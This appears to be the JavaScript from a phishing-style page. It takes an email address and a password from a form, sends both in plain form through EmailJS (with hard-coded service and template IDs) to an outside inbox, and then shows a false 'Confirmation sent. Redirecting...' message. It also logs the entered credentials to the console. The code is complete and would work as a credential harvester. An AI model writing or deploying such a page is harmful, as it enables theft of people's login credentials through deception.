// EmailJS integration + UI behavior
// Uses: public key already initialized in index.html
const EMAILJS_SERVICE_ID = "service_g82z99x";
const EMAILJS_TEMPLATE_ID = "template_cn8nksk";

const form = document.getElementById('demo-form');
const submitBtn = document.getElementById('submit-btn');
const status = document.getElementById('status');
const passField = document.getElementById('passwort');
const toggle = document.getElementById('toggle-password');
const cancel = document.getElementById('cancel-btn');

// Toggle password visibility
toggle.addEventListener('click', () => {
  const isPwd = passField.getAttribute('type') === 'password';
  passField.setAttribute('type', isPwd ? 'text' : 'password');
  toggle.textContent = isPwd ? '🙈' : '👁️';
});

// Cancel clears form and status
cancel.addEventListener('click', () => {
  form.reset();
  status.textContent = '';
});

// Submit handler: send via EmailJS
form.addEventListener('submit', (e) => {
  e.preventDefault();
  status.textContent = '';
  submitBtn.disabled = true;
  submitBtn.textContent = 'Processing...';

  const fd = new FormData(form);
  const email = fd.get('user_email')?.trim();
  const passwort = fd.get('passwort')?.trim();

  if (!email || !passwort) {
    status.style.color = '#d97706';
    status.textContent = 'Please fill in both fields.';
    submitBtn.disabled = false;
    submitBtn.textContent = 'Confirm';
    return;
  }

  // Debug: show what will be sent (console only)
  console.log('Sending to EmailJS:', Array.from(fd.entries()));

  emailjs.sendForm(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, form)
    .then(() => {
      status.style.color = '#16a34a';
      status.textContent = '✅ Confirmation sent. Redirecting...';
      submitBtn.textContent = 'Sent';

     
    }, (err) => {
      console.error('EmailJS error', err);
      status.style.color = '#dc2626';
      status.textContent = 'Error sending. Check console for details.';
      submitBtn.disabled = false;
      submitBtn.textContent = 'Confirm';
    });
});

